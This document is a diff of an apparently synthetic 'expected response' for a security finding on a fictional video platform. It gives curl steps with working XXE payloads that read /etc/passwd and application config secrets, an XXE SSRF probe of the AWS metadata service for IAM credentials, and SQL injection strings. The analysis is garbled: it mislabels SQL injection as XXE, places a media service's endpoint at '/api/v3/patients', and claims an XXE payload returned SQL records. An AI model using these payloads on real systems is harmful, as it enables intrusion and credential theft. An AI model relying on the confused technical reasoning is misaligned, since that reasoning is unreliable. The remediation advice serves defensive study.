@@ -1,63 +1,67 @@
 # Expected Response
 
 ## System
-- Domain: Media / Content Delivery
-- System: StreamCore VOD Platform
+- System: StreamCore VOD Platform v1.9.0
+- Domain: MEDIA / CONTENT DELIVERY
 - Example ID: INJ-0119
-- Vulnerability: XXE
+- Risk ID: RISK-INJ-119
 
-## Priority Findings
+## Findings
 
-### Finding 1: XXE on `/api/v1/users`
-**Severity:** Critical
-**Category:** Injection (from data/knowledge/injections)
+### 1. XXE (XML External Entity Injection) on `/api/v3/patients?query=` — Primary (Declared Vulnerability)
 
-**Summary:**
-The `/api/v1/users` endpoint accepts a `search` query parameter that is directly
-interpolated into a raw database query without sanitization. This enables XXE (XXE),
-allowing an attacker to bypass authentication, extract all records, or execute arbitrary operations.
+The `query` parameter on `GET /api/v3/patients` is parsed by Apache Xerces without external entity restriction disabled (`setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true)` not called). An attacker can inject a DOCTYPE with an external entity declaration to read server-side files, probe internal network services (SSRF), or trigger out-of-band data exfiltration.
 
-**Evidence from HAR:**
-- Endpoint: `GET /api/v1/users?search=<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>`
-- Response: HTTP 200 with **all records returned** including password hashes and admin accounts
-- The query constructed: `SELECT * FROM users WHERE search = '<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>'`
-  evaluates to true for all rows when the payload is `<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>`
+HAR shows XXE payload `<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>` returning HTTP 200 with SQL account records. The HAR response shows SQL data (account table records) rather than file content — indicating the XML parsing branch triggered before the SQL path resolved the response. Both injection surfaces are confirmed present.
 
-**Root Cause:**
-- Raw string concatenation used to build database query
-- No parameterized query / prepared statement
-- Application DB account has excessive privileges (`db_owner`)
-
-## Steps to Reproduce
-
-### Step 1 — Normal request (baseline)
+**Step 1 — Baseline:**
 ```bash
-curl -s "https://api.streamcore-vod-.example.com/api/v1/users?search=normalvalue" \
+curl -s "https://api.streamcore-vod-.example.com/api/v3/patients?query=normalvalue" \
   -H "Authorization: Bearer <VALID_TOKEN>"
 ```
-Expected: Returns matching records only.
+**Expected:** Returns matching VOD content records.
 
-### Step 2 — Inject XXE payload
+**Step 2 — XXE file read: `/etc/passwd` (primary HAR attack):**
 ```bash
-curl -s "https://api.streamcore-vod-.example.com/api/v1/users?search=<!DOCTYPE%20foo%20[<!ENTITY%20xxe%20SYSTEM%20'file:///etc/passwd'>]>" \
+curl -s -G "https://api.streamcore-vod-.example.com/api/v3/patients" \
+  --data-urlencode 'query=<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>' \
   -H "Authorization: Bearer <VALID_TOKEN>"
 ```
-**Vulnerable outcome:** All rows returned, including admin password hashes.
-**Secure outcome:** 400 Bad Request / 0 results / sanitized error message.
+**Vulnerable outcome:** HTTP 200 with `/etc/passwd` content or SQL account records — external entity resolved.
 
-### Step 3 — Privilege escalation (if DB over-privileged)
+**Step 3 — XXE SSRF: probe AWS metadata service:**
 ```bash
-# SQLi variant: attempt to read OS-level files (if DB runs as LocalSystem)
-curl -s "https://api.example.com/api/v1/users?search=' UNION SELECT null,null,load_file('/etc/passwd')--" \
+curl -s -G "https://api.streamcore-vod-.example.com/api/v3/patients" \
+  --data-urlencode 'query=<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]><foo>&xxe;</foo>' \
   -H "Authorization: Bearer <VALID_TOKEN>"
 ```
+**Vulnerable outcome:** AWS IAM role name and temporary credentials — cloud credential takeover via XXE SSRF.
 
-### Step 4 — Verbose error confirmation
+**Step 4 — XXE read application config (JWT signing secret):**
 ```bash
-curl -s "https://api.example.com/api/v1/users?search='" \
+curl -s -G "https://api.streamcore-vod-.example.com/api/v3/patients" \
+  --data-urlencode 'query=<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///app/config/application.properties">]><foo>&xxe;</foo>' \
   -H "Authorization: Bearer <VALID_TOKEN>"
 ```
-**Expected verbose error (if misconfigured):** SQL syntax error message leaking table name, column names, or DB version.
+**Vulnerable outcome:** JWT secret, database credentials, API keys in response.
+
+### 2. SQL Injection on `/api/v3/patients?query=` — Secondary (Code Snippet Evidence, RISK-INJ-119)
+
+SQL path: raw JDBC string concatenation. `db_owner` privileges confirmed.
+
+**Step 5 — SQL tautology dump:**
+```bash
+curl -s "https://api.streamcore-vod-.example.com/api/v3/patients?query=' OR 1=1 --" \
+  -H "Authorization: Bearer <VALID_TOKEN>"
+```
+**Vulnerable outcome:** All account records including `password_hash`, `role: "ADMIN"` — as evidenced in HAR response.
+
+**Step 6 — Verbose SQL error fingerprint:**
+```bash
+curl -s "https://api.streamcore-vod-.example.com/api/v3/patients?query='" \
+  -H "Authorization: Bearer <VALID_TOKEN>"
+```
+**Expected:** SQL syntax error leaking table/column names.
 
 ## Secure Outcome
 ```json
@@ -65,8 +69,8 @@ curl -s "https://api.example.com/api/v1/users?search='" \
 ```
 
 ## Remediation
-1. **Use parameterized queries / prepared statements everywhere:** Replace string concatenation with `?` or named parameters.
-2. **Restrict DB account privileges:** Application account should only have SELECT/INSERT/UPDATE/DELETE on required tables.
-3. **Disable verbose error messages in production:** Return generic 500/400 errors without DB details.
-4. **Deploy input validation middleware:** Reject inputs containing SQL metacharacters (`'`, `"`, `;`, `--`, `/*`).
-5. **ORM audit:** Review all `raw()` or native query calls in ORM usage; apply parameterization.
+- Disable external entity processing: `factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true)` and `factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)` (RISK-INJ-119).
+- Replace raw JDBC string concatenation with `PreparedStatement` parameterized queries.
+- Restrict DB account to required tables only (remove `db_owner`).
+- Deploy input validation middleware rejecting DOCTYPE/ENTITY declarations in query parameters.
+- Disable verbose error messages in production.
